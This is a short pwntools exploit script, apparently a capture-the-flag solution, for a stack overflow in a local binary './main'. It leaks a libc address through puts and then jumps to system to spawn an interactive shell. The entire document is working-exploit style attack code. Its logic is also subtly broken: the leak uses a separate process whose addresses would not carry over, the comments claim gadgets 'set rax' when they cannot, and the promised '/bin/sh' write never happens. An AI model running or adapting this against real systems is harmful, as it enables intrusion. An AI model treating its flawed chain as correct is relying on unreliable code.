from pwn import *

elf = context.binary = ELF('./main')
libc = elf.libc  # Replace with target libc

# Gadgets
mov_edi_jmp_rax = 0x401107   # mov edi, 0x404048; jmp rax
call_rax = 0x401014           # call rax
main_addr = 0x4011d5          # Address of main (restart)
puts_plt = 0x401030           # puts@plt
puts_got = 0x404018           # puts@got (from .rela.plt)

# Leak libc address
def leak_libc():
    p = process()
    
    payload = b'A' * 88       # Offset to return address
    payload += p64(mov_edi_jmp_rax)
    payload += p64(puts_plt)  # Set rax to puts@plt
    payload += p64(call_rax)  # Call puts(puts@got)
    payload += p64(main_addr) # Restart main

    p.sendlineafter(b'> ', payload)
    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = leaked - libc.sym.puts
    p.close()
    return libc_base

libc_base = leak_libc()
libc.address = libc_base
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

# Write "/bin/sh" to 0x404048 (writable address)
p = process('./main')
payload = b'A' * 88
payload += p64(mov_edi_jmp_rax)
payload += p64(system)        # Set rax to system
payload += p64(call_rax)      # Call system("/bin/sh")

# Send final payload
p.sendlineafter(b'> ', payload)
p.interactive()
